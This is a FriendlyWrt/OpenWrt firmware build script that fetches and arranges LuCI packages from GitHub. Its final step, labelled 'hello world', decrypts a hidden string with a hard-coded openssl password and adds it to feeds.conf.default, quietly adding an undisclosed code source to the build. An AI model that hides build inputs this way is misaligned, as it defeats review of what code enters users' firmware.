# Enter the "package" directory.
cd package

# lean
svn co https://github.com/coolsnowwolf/lede/trunk/package/lean
cp -r lean/* ./
rm -rf lean luci-lib-docker luci-app-docker luci-app-diskman autocore parted luci-theme-argon
[ -f luci-app-ttyd/root/etc/init.d/ttyd ] && rm luci-app-ttyd/root/etc/init.d/ttyd
[ -f luci-app-rclone/luasrc/controller/rclone.lua ] && sed -i '/firstchild/Id;s/nas/services/g' luci-app-rclone/luasrc/controller/rclone.lua

# autocore
cp -r ../../../package/autocore autocore

git clone -b 18.06 https://github.com/jerrykuku/luci-theme-argon.git

# ServerChan
git clone https://github.com/tty228/luci-app-serverchan

# dockerman
svn co https://github.com/lisaac/luci-app-dockerman/trunk/applications/luci-app-dockerman
svn co https://github.com/lisaac/luci-lib-docker/trunk/collections/luci-lib-docker

# Return to "friendlywrt" directory.
cd ../

# diskman
mkdir -p package/luci-app-diskman
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Makefile -O package/luci-app-diskman/Makefile
mkdir -p package/parted
wget https://raw.githubusercontent.com/lisaac/luci-app-diskman/master/Parted.Makefile -O package/parted/Makefile

# hello world
sed -i "/routing/a\\$(echo "U2FsdGVkX1+AeI7cP72nGJzrdtGxFrYZW+kKEANWGZryYXLSls7b7Z3awocMj1hEJ15w20FKz2msgAoTnYyILpGZKHr+nxL/GoilV5oHp8Q=" | openssl enc -aes-256-cbc -a -d -pass pass:"vinewx" -pbkdf2)" feeds.conf.default
